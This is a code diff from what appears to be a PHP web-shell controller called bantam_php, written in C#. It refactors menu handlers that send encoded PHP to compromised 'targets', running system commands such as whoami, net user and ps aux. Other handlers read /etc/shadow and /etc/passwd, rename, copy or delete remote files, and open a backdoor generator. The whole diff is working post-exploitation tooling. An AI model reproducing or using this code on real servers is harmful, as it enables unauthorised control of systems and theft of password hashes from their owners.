+            startRichtextboxThread(phpCode, "Viewing File -" + path);
         }
 
         /// <summary>
@@ -1037,16 +975,15 @@ namespace bantam_php
 
             string fileName = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
             string path = treeViewFileBrowser.SelectedNode.Parent.FullPath.Replace('\\', '/');
-            string newFileName = DynamicPrompts.RenameFileDialog(fileName, "Renaming File");
+            string newFileName = CustomForms.RenameFileDialog(fileName, "Renaming File");
 
             if (newFileName != "")
             {
+                //todo abstract
                 string newFile = path + '/' + newFileName;
-                string code = "@rename('" + fileName + "', '" + newFile + "');";
+                string phpCode = "@rename('" + fileName + "', '" + newFile + "');";
 
-                //start main thread
-                Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
-                t.Start((object)new DynamicThreadArgs(target, code));
+                startPhpExecutionThread(phpCode);
             }
         }
 
@@ -1067,11 +1004,10 @@ namespace bantam_php
 
             if (dialogResult == DialogResult.Yes)
             {
+                //todo abstract
                 string code = "@unlink('" + path + "');";
 
-                //start main thread
-                Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
-                t.Start((object)new DynamicThreadArgs(target, code));
+                startPhpExecutionThread(code);
             }
         }
 
@@ -1087,18 +1023,24 @@ namespace bantam_php
                 return;
             }
 
+            string path;
             string fileName = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
-            string path = treeViewFileBrowser.SelectedNode.Parent.FullPath.Replace('\\', '/');
-            string newFileName = DynamicPrompts.RenameFileDialog(fileName, "Copying File");
+
+            if (treeViewFileBrowser.SelectedNode.Parent != null)
+            {
+                path = treeViewFileBrowser.SelectedNode.Parent.FullPath.Replace('\\', '/');
+            } else {
+                path = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
+            }
+
+            string newFileName = CustomForms.RenameFileDialog(fileName, "Copying File");
 
             if (newFileName != "")
             {
                 string newFile = path + '/' + newFileName;
                 string code = "@copy('" + fileName + "', '" + newFile + "');";
 
-                //start main thread
-                Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
-                t.Start((object)new DynamicThreadArgs(target, code));
+                startPhpExecutionThread(code);
             }
         }
 
@@ -1119,14 +1061,10 @@ namespace bantam_php
                 return;
             }
 
-            string directoryContentsPHPCode = PHP_Helper.getDirectoryEnumerationCode(txtBoxFileBrowserPath.Text, Clients[target].PHP_Version);
+            string directoryContentsPHPCode = PHP.getDirectoryEnumerationCode(txtBoxFileBrowserPath.Text, Clients[g_SelectedTarget].PHP_Version);
 
-            //setup main thread
-            DynamicThreadArgs threadArgs = new DynamicThreadArgs(target, directoryContentsPHPCode, fileBrowserBtnGoClickMethod, new object[] { target });
-
-            //start main thread
-            Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
-            t.Start((object)threadArgs);
+            //todo fix the need of selected target being passed??...
+            startPhpExecutionThread(directoryContentsPHPCode, fileBrowserBtnGoClickMethod);
         }
 
         #endregion
@@ -1145,14 +1083,7 @@ namespace bantam_php
                 return;
             }
 
-            //default to linux, override to windows if needed
-            string code = "@system('ps aux');";
-            if (Clients[target].Windows)
-            {
-                code = "@system('tasklist');";
-            }
-
-            startRichTextBoxThread(code, "Process List");
+            startRichtextboxThread(PHP.getTaskListFunction(Clients[g_SelectedTarget].isWindows), "Process List");
         }
 
         //Triggered via MENU_ITEM_CLICK
@@ -1169,13 +1100,10 @@ namespace bantam_php
                 return;
             }
 
-            if (Clients[target].Windows)
+            if (Clients[g_SelectedTarget].isWindows)
             {
-                string code = "@system('net user');";
-                startRichTextBoxThread(code, "User Account");
-            }
-            else
-            {
+                startRichtextboxThread(PHP.windowsOS_NetUser, "User Account");
+            } else {
                 MessageBox.Show("This client is linux!", "DERP!!");
             }
         }
@@ -1192,13 +1120,10 @@ namespace bantam_php
                 return;
             }
 
-            if (Clients[target].Windows)
+            if (Clients[g_SelectedTarget].isWindows)
             {
-                string code = "@system('net accounts');";
-                startRichTextBoxThread(code, "User Accounts");
-            }
-            else
-            {
+                startRichtextboxThread(PHP.windowsOS_NetAccounts, "User Accounts");
+            } else {
                 MessageBox.Show("This client is linux!", "DERP!!");
             }
         }
@@ -1215,13 +1140,10 @@ namespace bantam_php
                 return;
             }
 
-            if (Clients[target].Windows)
+            if (Clients[g_SelectedTarget].isWindows)
             {
-                string code = "@system('ipconfig');";
-                startRichTextBoxThread(code, "ipconfig");
-            }
-            else
-            {
+                startRichtextboxThread(PHP.windowsOS_Ipconfig, "ipconfig");
+            } else {
                 MessageBox.Show("This client is linux!", "DERP!!");
             }
         }
@@ -1238,13 +1160,10 @@ namespace bantam_php
                 return;
             }
 
-            if (Clients[target].Windows)
+            if (Clients[g_SelectedTarget].isWindows)
             {
-                string code = "@system('ver');";
-                startRichTextBoxThread(code, "ver");
-            }
-            else
-            {
+                startRichtextboxThread(PHP.windowsOS_Ver, "ver");
+            } else {
                 MessageBox.Show("This client is linux!", "DERP!!");
             }
         }
@@ -1261,15 +1180,7 @@ namespace bantam_php
                 return;
             }
 
-            if (Clients[target].Windows == false)
-            {
-                string code = "@system('whoami');";
-                startRichTextBoxThread(code, "whoami");
-            }
-            else
-            {
-                MessageBox.Show("This client is windows!", "DERP!!");
-            }
+            startRichtextboxThread(PHP.posixOS_Whoami, "whoami");
         }
 
         /// <summary>
@@ -1284,13 +1195,10 @@ namespace bantam_php
                 return;
             }
 
-            if (Clients[target].Windows == false)
+            if (Clients[g_SelectedTarget].isLinux)
             {
-                string code = "@system('ifconfig');";
-                startRichTextBoxThread(code, "ifconfig");
-            }
-            else
-            {
+                startRichtextboxThread(PHP.linuxOS_Ifconfig, "ifconfig");
+            } else {
                 MessageBox.Show("This client is windows!", "DERP!!");
             }
         }
@@ -1303,20 +1211,18 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void windowsHostsMenuItem_Click(object sender, EventArgs e)
+        private void windowsTargetsMenuItem_Click(object sender, EventArgs e)
         {
             if (validTarget() == false)
             {
                 return;
             }
 
-            if (Clients[target].Windows)
+            if (Clients[g_SelectedTarget].isWindows)
             {
-                string code = "echo @is_readable('C:\\Windows\\System32\\drivers\\etc\\hosts') ? file_get_contents('C:\\Windows\\System32\\drivers\\etc\\hosts') : 'File Not Readable';";
-                startRichTextBoxThread(code, "hosts");
-            }
-            else
-            {
+                string phpCode = PHP.readFileProcedure(PHP.windowsFS_hostTargets);
+                startRichtextboxThread(phpCode, "hosts");
+            } else {
                 MessageBox.Show("This client is windows!", "DERP!!");
             }
         }
@@ -1333,13 +1239,11 @@ namespace bantam_php
                 return;
             }
 
-            if (Clients[target].Windows == false)
+            if (Clients[g_SelectedTarget].isLinux)
             {
-                string code = "echo @is_readable('/etc/network/interfaces') ? file_get_contents('/etc/network/interfaces') : 'File Not Readable';";
-                startRichTextBoxThread(code, "interfaces");
-            }
-            else
-            {
+                string phpCode = PHP.readFileProcedure(PHP.linuxFS_NetworkInterfaces);
+                startRichtextboxThread(phpCode, "interfaces");
+            } else {
                 MessageBox.Show("This client is windows!", "DERP!!");
             }
         }
@@ -1356,13 +1260,11 @@ namespace bantam_php
                 return;
             }
 
-            if (Clients[target].Windows == false)
+            if (Clients[g_SelectedTarget].isLinux)
             {
-                string code = "echo @is_readable('/proc/version') ? file_get_contents('/proc/version') : 'File Not Readable';";
-                startRichTextBoxThread(code, "version");
-            }
-            else
-            {
+                string phpCode = PHP.readFileProcedure(PHP.linuxFS_ProcVersion);
+                startRichtextboxThread(phpCode, "version");
+            } else {
                 MessageBox.Show("This client is windows!", "DERP!!");
             }
         }
@@ -1372,20 +1274,18 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void linuxHostsMenuItem_Click(object sender, EventArgs e)
+        private void linuxhostsMenuItem_Click(object sender, EventArgs e)
         {
             if (validTarget() == false)
             {
                 return;
             }
 
-            if (Clients[target].Windows == false)
+            if (Clients[g_SelectedTarget].isLinux)
             {
-                string code = "echo @is_readable('/etc/hosts') ? file_get_contents('/etc/hosts') : 'File Not Readable';";
-                startRichTextBoxThread(code, "hosts");
-            }
-            else
-            {
+                string phpCode = PHP.readFileProcedure(PHP.linuxFS_hostTargetsFile);
+                startRichtextboxThread(phpCode, "hosts");
+            } else {
                 MessageBox.Show("This client is windows!", "DERP!!");
             }
         }
@@ -1402,13 +1302,11 @@ namespace bantam_php
                 return;
             }
 
-            if (Clients[target].Windows == false)
+            if (Clients[g_SelectedTarget].isLinux)
             {
-                string code = "echo @is_readable('/etc/issue.net') ? file_get_contents('/etc/issue.net') : 'File Not Readable';";
-                startRichTextBoxThread(code, "issue.net");
-            }
-            else
-            {
+                string phpCode = PHP.readFileProcedure(PHP.linuxFS_IssueFile);
+                startRichtextboxThread(phpCode, "issue.net");
+            } else {
                 MessageBox.Show("This client is windows!", "DERP!!");
             }
         }
@@ -1418,20 +1316,18 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void shadowToolStripMenuItem_Click_1(object sender, EventArgs e)
+        private void shadowToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (validTarget() == false)
             {
                 return;
             }
 
-            if (Clients[target].Windows == false)
+            if (Clients[g_SelectedTarget].isLinux)
             {
-                string code = "echo @is_readable('/etc/shadow') ? file_get_contents('/etc/shadow') : 'File Not Readable';";
-                startRichTextBoxThread(code, "shadow");
-            }
-            else
-            {
+                string phpCode = PHP.readFileProcedure(PHP.linuxFS_ShadowFile);
+                startRichtextboxThread(phpCode, "shadow");
+            } else {
                 MessageBox.Show("This Target does not have a shadow file (derp)", "You TARD");
             }
         }
@@ -1441,20 +1337,18 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void passwdToolStripMenuItem_Click_1(object sender, EventArgs e)
+        private void passwdToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (validTarget() == false)
             {
                 return;
             }
 
-            if (Clients[target].Windows == false)
+            if (Clients[g_SelectedTarget].isLinux)
             {
-                string code = "echo @is_readable('/etc/passwd') ? file_get_contents('/etc/passwd') : 'File Not Readable';";
-                startRichTextBoxThread(code, "passwd");
-            }
-            else
-            {
+                string phpCode = PHP.readFileProcedure(PHP.linuxFS_PasswdFile);
+                startRichtextboxThread(phpCode, "passwd");
+            } else {
                 MessageBox.Show("This Target does not have a passwd file (derp)");
             }
         }
@@ -1492,9 +1386,7 @@ namespace bantam_php
                     request.Method = "GET";
                     request.CookieContainer = new CookieContainer();
                     request.CookieContainer.SetCookies(new Uri(url), postData);
-                }
-                else
-                {
+                } else {
                     //send the commands via [POST]
                     request.Method = "POST";
                     request.ContentType = "application/x-www-form-urlencoded";
@@ -1538,7 +1430,7 @@ namespace bantam_php
             }
 
             //remove extra spaces, line breakes, tabs, whitespace, urlendcode then base64 encode
-            string minifiedCode = PHP_Helper.minifyCode(code);
+            string minifiedCode = PHP.minifyCode(code);
             string encodedCode = HttpUtility.UrlEncode(minifiedCode);
             var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(encodedCode);
             string b64 = System.Convert.ToBase64String(plainTextBytes);
@@ -1552,6 +1444,17 @@ namespace bantam_php
         {
             BackdoorGenerator backdoorGenerator = new BackdoorGenerator();
             backdoorGenerator.Show();
+        }
+
+        private void pingClientsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void addToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            AddHost addClientForm = new AddHost();
+            addClientForm.Show();
         }
     }
 }
